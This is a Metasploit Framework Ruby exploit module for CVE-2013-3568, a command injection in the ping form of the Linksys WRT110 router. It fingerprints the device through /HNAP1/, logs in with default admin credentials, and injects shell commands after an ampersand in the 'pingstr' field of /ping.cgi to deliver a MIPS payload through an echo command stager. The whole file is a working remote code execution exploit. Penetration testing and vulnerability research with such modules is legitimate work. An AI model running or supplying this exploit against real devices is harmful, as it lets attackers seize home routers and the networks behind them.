# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStagerEcho

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Linksys WRT110 Remote Command Execution&#039;,
      &#039;Description&#039; => %q{
        The Linksys WRT110 consumer router is vulnerable to a command injection
        exploit in the ping field of the web interface.
      },
      &#039;Author&#039;      =>
        [
          &#039;Craig Young&#039;, # Vulnerability discovery
          &#039;joev <jvennix[at]rapid7.com>&#039;, # msf module
          &#039;juan vazquez&#039; # module help + echo cmd stager
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [&#039;CVE&#039;, &#039;2013-3568&#039;],
          [&#039;BID&#039;, &#039;61151&#039;],
          [&#039;URL&#039;, &#039;http://seclists.org/bugtraq/2013/Jul/78&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Jul 12 2013&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => [&#039;linux&#039;],
      &#039;Arch&#039;           => ARCH_MIPSLE,
      &#039;Targets&#039;        =>
        [
            [&#039;Linux mipsel Payload&#039;, { } ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      ))

    register_options([
      OptString.new(&#039;USERNAME&#039;, [ true, &#039;Valid router administrator username&#039;, &#039;admin&#039;]),
      OptString.new(&#039;PASSWORD&#039;, [ false, &#039;Password to login with&#039;, &#039;admin&#039;]),
      OptAddress.new(&#039;RHOST&#039;, [true, &#039;The address of the router&#039;, &#039;192.168.1.1&#039;]),
      OptInt.new(&#039;TIMEOUT&#039;, [false, &#039;The timeout to use in every request&#039;, 20])
    ], self.class)

  end

  def check
    begin
      res = send_request_cgi({
        &#039;uri&#039; => &#039;/HNAP1/&#039;
      })
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Safe
    end

    if res and res.code == 200 and res.body =~ /<ModelName>WRT110<\/ModelName>/
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    test_login!

    execute_cmdstager
  end

  # Sends an HTTP request with authorization header to the router
  # Raises an exception unless the login is successful
  def test_login!
    print_status("#{rhost}:#{rport} - Trying to login with #{user}:#{pass}")

    res = send_auth_request_cgi({
      &#039;uri&#039; => &#039;/&#039;,
      &#039;method&#039; => &#039;GET&#039;
    })

    if not res or res.code == 401 or res.code == 404
      fail_with(Failure::NoAccess, "#{rhost}:#{rport} - Could not login with #{user}:#{pass}")
    else
      print_good("#{rhost}:#{rport} - Successful login #{user}:#{pass}")
    end
  end

  # Run the command on the router
  def execute_command(cmd, opts)
    send_auth_request_cgi({
      &#039;uri&#039; => &#039;/ping.cgi&#039;,
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => {
         &#039;pingstr&#039; => &#039;& &#039; + cmd
      }
    })

    Rex.sleep(1) # Give the device a second
  end

  # Helper methods
  def user; datastore[&#039;USERNAME&#039;]; end
  def pass; datastore[&#039;PASSWORD&#039;] || &#039;&#039;; end

  def send_auth_request_cgi(opts={}, timeout=nil)
    timeout ||= datastore[&#039;TIMEOUT&#039;]
    opts.merge!(&#039;authorization&#039; => basic_auth(user, pass))
    begin
      send_request_cgi(opts, timeout)
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Could not connect to the webservice")
    end
  end
end

